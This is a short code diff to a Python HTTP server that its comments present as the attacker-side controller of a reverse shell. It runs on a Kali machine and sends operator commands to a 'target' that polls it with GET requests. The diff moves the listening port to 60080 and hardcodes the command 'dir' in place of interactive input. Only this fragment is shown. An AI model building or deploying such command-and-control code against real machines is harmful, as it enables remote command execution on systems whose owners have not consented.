@@ -2,15 +2,18 @@
 from http.server import BaseHTTPRequestHandler,HTTPServer
 
 HOST_NAME = '127.0.0.1' # Kali IP address 
-PORT_NUMBER = 8080 # Listening port number 
+PORT_NUMBER = 60080 # Listening port number 
 
 
 class MyHandler(BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST request
                                                           # from the client / target
 
     def do_GET(s):
-                                         #If we got a GET request, we will:- 
-        command = input() #take user input
+        #If we got a GET request, we will:- 
+        print("pleae enter command")
+        # command = input() #take user input
+        command = "dir"
+        print(command)
         s.send_response(200) #return HTML status 200 (OK)
         s.send_header("Content-type", "text/html") # Inform the target that content type header is "text/html"
         s.end_headers()
